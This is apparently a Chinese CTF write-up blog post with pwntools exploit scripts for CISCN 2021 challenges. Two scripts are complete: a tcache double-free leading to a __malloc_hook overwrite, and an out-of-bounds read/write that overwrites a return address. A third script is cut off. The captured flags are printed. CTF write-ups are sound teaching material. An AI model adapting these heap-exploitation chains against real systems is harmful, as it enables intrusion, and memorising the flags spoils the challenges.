@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">Ciscn2021 Pwn - Niebelungen</title><meta name="Description" content="Niebelungen"><meta property="og:title" content="Ciscn2021 Pwn" />
+<meta property="og:description" content="Ciscn2021-pwn国赛部分pwn题的解答 lonelywolfdouble_free leak heap address ，打tcache_struct,leak libc，控制 next指针覆写__mallo" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/ciscn2021-pwn/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-26T00:27:39+08:00" />
+<meta property="article:modified_time" content="2021-05-26T00:27:39+08:00" /><meta property="og:site_name" content="Niebelungen" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="Ciscn2021 Pwn"/>
+<meta name="twitter:description" content="Ciscn2021-pwn国赛部分pwn题的解答 lonelywolfdouble_free leak heap address ，打tcache_struct,leak libc，控制 next指针覆写__mallo"/>
+<meta name="application-name" content="Niebelungen">
+<meta name="apple-mobile-web-app-title" content="Niebelungen">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://example.org/ciscn2021-pwn/" /><link rel="prev" href="http://example.org/challenges-100-week-10/" /><link rel="next" href="http://example.org/2021dasxbuuctf-may/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Ciscn2021 Pwn",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/ciscn2021-pwn\/"
+        },"genre": "posts","keywords": "Writeups","wordcount":  904 ,
+        "url": "http:\/\/example.org\/ciscn2021-pwn\/","datePublished": "2021-05-26T00:27:39+08:00","dateModified": "2021-05-26T00:27:39+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Niebelungen"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme);}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Niebelungen">Niebelungen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Niebelungen">Niebelungen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents"></nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ciscn2021 Pwn</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Niebelungen</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-26">2021-05-26</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-05-26">2021-05-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 904 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="ciscn2021-pwn" class="headerLink">
+    <a href="#ciscn2021-pwn" class="header-mark"></a>Ciscn2021-pwn</h1><p>国赛部分pwn题的解答</p>
+<!-- more -->
+<h1 id="lonelywolf" class="headerLink">
+    <a href="#lonelywolf" class="header-mark"></a>lonelywolf</h1><p>double_free leak heap address ，打tcache_struct,leak libc，控制 next指针覆写__malloc_hook为og</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+</span></span><span class="line"><span class="cl">context(arch = &#39;amd64&#39; , os = &#39;linux&#39;, log_level=&#39;debug&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># p = process(&#34;./lonelywolf&#34;,env={&#39;LD_PRELOAD&#39;:&#34;./libc-2.27.so&#34;})
+</span></span><span class="line"><span class="cl">p = remote(&#39;123.60.210.12&#39;,21885)
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">def add(size):
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Your choice: &#34;, &#39;1&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Index:&#34;, &#39;0&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Size:&#34;, str(size))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def delete():
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Your choice: &#34;, &#39;4&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Index:&#34;, &#39;0&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def edit(payload):
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Your choice: &#34;, &#39;2&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Index:&#34;, &#39;0&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Content: &#34;, payload)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def show():
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Your choice: &#34;, &#39;3&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#34;Index:&#34;, &#39;0&#39;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">libc = ELF(&#39;./libc-2.27.so&#39;)
+</span></span><span class="line"><span class="cl">one = [0x4f3d5,0x4f432,0x10a41c]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    add(0x78)
+</span></span><span class="line"><span class="cl">    delete()
+</span></span><span class="line"><span class="cl">    edit(&#39;8&#39;*9)
+</span></span><span class="line"><span class="cl">    delete()
+</span></span><span class="line"><span class="cl">    show()
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    heap_base = u64(p.recvuntil(&#39;\x55&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x260
+</span></span><span class="line"><span class="cl">    print(hex(heap_base))
+</span></span><span class="line"><span class="cl">    # edit(&#39;8&#39;*9)
+</span></span><span class="line"><span class="cl">    # delete()
+</span></span><span class="line"><span class="cl">    # pause()
+</span></span><span class="line"><span class="cl">    edit(p64(heap_base+0x10))
+</span></span><span class="line"><span class="cl">    add(0x78)
+</span></span><span class="line"><span class="cl">    add(0x78) # ub
+</span></span><span class="line"><span class="cl">    edit(&#39;A&#39;*0x30)
+</span></span><span class="line"><span class="cl">    # add(0x10)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    delete()
+</span></span><span class="line"><span class="cl">    show()
+</span></span><span class="line"><span class="cl">    malloc_hook = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 96 - 0x10
+</span></span><span class="line"><span class="cl">    libcbase = malloc_hook - libc.sym[&#39;__malloc_hook&#39;]
+</span></span><span class="line"><span class="cl">    print(hex(libcbase))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # add(0x78)
+</span></span><span class="line"><span class="cl">    edit(p64(malloc_hook)*10)
+</span></span><span class="line"><span class="cl">    add(0x10)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    og = libcbase+one[2]
+</span></span><span class="line"><span class="cl">    edit(p64(og))
+</span></span><span class="line"><span class="cl">    # gdb.attach(p)
+</span></span><span class="line"><span class="cl">    show()  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    p.interactive()  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag = CISCN{iMf3k-MX3gi-NxKKS-IWx8t-5HlNV-}</p>
+<h1 id="pwny" class="headerLink">
+    <a href="#pwny" class="header-mark"></a>pwny</h1><p>数组超界，使用fini_array泄露程序基址，environ泄露栈，覆盖返回地址为og</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+</span></span><span class="line"><span class="cl">context(arch = &#39;amd64&#39; , os = &#39;linux&#39;, log_level=&#39;debug&#39;)
+</span></span><span class="line"><span class="cl"># p = process(&#34;./pwny&#34;,env={&#39;LD_PRELOAD&#39;:&#34;./libc-2.27.so&#34;})
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">libc = ELF(&#39;./libc-2.27.so&#39;)
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">def read(idx):
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Your choice: &#39;,&#39;1&#39;)
+</span></span><span class="line"><span class="cl">    p.sendafter(&#39;Index:&#39;,p64(idx))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def write(idx,data):
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Your choice: &#39;,&#39;2&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Index:&#39;,str(idx))
+</span></span><span class="line"><span class="cl">    p.sendline(data)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">one = [0x4f3d5,0x4f432,0x10a41c]
+</span></span><span class="line"><span class="cl"># fini_array = 0x201D88
+</span></span><span class="line"><span class="cl"># base = 0x202060
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    p = remote(&#39;123.60.210.12&#39;,21970)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Your choice: &#39;,&#39;2&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Index:&#39;,str(256))
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Your choice: &#39;,&#39;2&#39;)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(&#39;Index:&#39;,str(256))    
+</span></span><span class="line"><span class="cl">    write(256, &#39;\x00&#39;*8)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    read(0xfffffffffffffffc)
+</span></span><span class="line"><span class="cl">    p.recvuntil(&#39;Result: &#39;)
+</span></span><span class="line"><span class="cl">    stderr_addr = int(p.recv(12),16)
+</span></span><span class="line"><span class="cl">    libcbase = stderr_addr - libc.sym[&#39;_IO_2_1_stderr_&#39;]
+</span></span><span class="line"><span class="cl">    print(hex(stderr_addr))
+</span></span><span class="line"><span class="cl">    print(hex(libcbase))
+</span></span><span class="line"><span class="cl">    # idx = 0xfffffffffffffffc-1
+</span></span><span class="line"><span class="cl">    read(0xffffffffffffffa5)
+</span></span><span class="line"><span class="cl">    # gdb.attach(p)
+</span></span><span class="line"><span class="cl">    p.recvuntil(&#39;Result: &#39;)
+</span></span><span class="line"><span class="cl">    text_addr = int(p.recv(12),16)
+</span></span><span class="line"><span class="cl">    textbase = text_addr - 0x9c0
+</span></span><span class="line"><span class="cl">    print(hex(textbase))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    env = libcbase + libc.sym[&#39;environ&#39;]
+</span></span><span class="line"><span class="cl">    print(hex(env))
+</span></span><span class="line"><span class="cl">    # stack = env - 0x10 
+</span></span><span class="line"><span class="cl">    base = 0x202060 + textbase
+</span></span><span class="line"><span class="cl">    print(hex(base))
+</span></span><span class="line"><span class="cl">    # pause()
+</span></span><span class="line"><span class="cl">    idx = (env - base)/8
+</span></span><span class="line"><span class="cl">    # idx = (~idx) + 1
+</span></span><span class="line"><span class="cl">    # print(hex(idx))
+</span></span><span class="line"><span class="cl">    read(idx)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    p.recvuntil(&#39;Result: &#39;)
+</span></span><span class="line"><span class="cl">    stack_addr = int(p.recv(12),16)
+</span></span><span class="line"><span class="cl">    ret_addr = stack_addr - 0x120
+</span></span><span class="line"><span class="cl">    print(hex(ret_addr))
+</span></span><span class="line"><span class="cl">    og = libcbase + one[2]
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    idx = (ret_addr - base )/8
+</span></span><span class="line"><span class="cl">    # gdb.attach(p)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    write(idx, p64(og))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    p.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag = CISCN{5o9ui-tLK7G-D1sUb-VrApG-dIhAm-}</p>
+<h1 id="silverwolf" class="headerLink">
+    <a href="#silverwolf" class="header-mark"></a>silverwolf</h1><p>泄漏libc和劫持__free_hook和lonely一样，找chunk分开写ROP，利用setcontext来控制栈迁移，需要两次栈迁移。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># p = process(&#34;./silverwolf&#34;, env={&#39;LD_PRELOAD&#39;: &#34;./libc-2.27.so&#34;})</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;123.60.210.12&#39;</span><span class="p">,</span> <span class="mi">21921</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice: &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice: &#34;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice: &#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Content: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice: &#34;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index:&#34;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
